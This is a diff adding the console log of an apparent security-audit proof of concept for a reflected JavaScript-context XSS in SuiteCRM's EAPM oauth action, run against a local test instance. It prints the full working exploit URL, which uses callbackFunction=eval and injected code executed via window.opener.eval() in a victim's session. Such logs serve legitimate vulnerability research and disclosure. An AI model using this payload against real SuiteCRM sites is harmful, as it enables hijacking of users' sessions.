@@ -1,0 +1,24 @@
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-043/../.venv
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.exec_prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-043/../.venv
+========================================================================
+VULN-043: Reflected JS-context XSS in EAPM::action_oauth (executes in window.opener)
+target: http://localhost:33116
+========================================================================
+[SETUP] creating a fresh low-privileged victim user as admin
+[OK] victim user created: mod_12ae4340 id=2cf8bfe9-8dc2-42c4-b90d-efb1ff6ad6c3
+[SETUP] logging in as the victim (web session, for the browser proof)
+[OK] victim web session established
+[STEP] legacy REST login as the victim, create an EAPM record (any valid id works -- disable_row_level_security=true)
+[OK] EAPM record created id=8b3660e9-1541-4c0f-93b6-6e15436b7dfd
+[STEP] GET module=EAPM&action=oauth&record=8b3660e9-1541-4c0f-93b6-6e15436b7dfd&oauth_error=1&closeWhenDone=1&callbackFunction=eval&application=top.__vuln043_fired%3Dtrue
+[INFO] HTTP 200, 89299 bytes
+[PROOF] unescaped 'window.opener.eval("top.__vuln043_fired=true");' present in response: True
+[STEP] launching headless Chromium (Playwright container): opener window opens the EAPM URL as a real popup
+[INFO] docker run mcr.microsoft.com/playwright:latest node pw.js
+[INFO] opener: navigating to http://localhost:33116/index.php?module=Home&action=index
+[INFO] opener: window.open(http://localhost:33116/index.php?module=EAPM&action=oauth&record=8b3660e9-1541-4c0f-93b6-6e15436b7dfd&oauth_error=1&closeWhenDone=1&callbackFunction=eval&application=top.__vuln043_fired%3Dtrue)
+[INFO] popup load settled with: page.waitForLoadState: Target page, context or browser has been closed
+[INFO] sentinel checked on the OPENER window (the victim's real session): true
+[RESULT] {"fired":true,"dialogMessage":null}
+[PROOF] DOM sentinel window.top.__vuln043_fired observed TRUE in the OPENER window (victim's real session) = True
+==> VULN-043: CONFIRMED — callbackFunction=eval/application=<code> executed via window.opener.eval() in the opener (victim) window
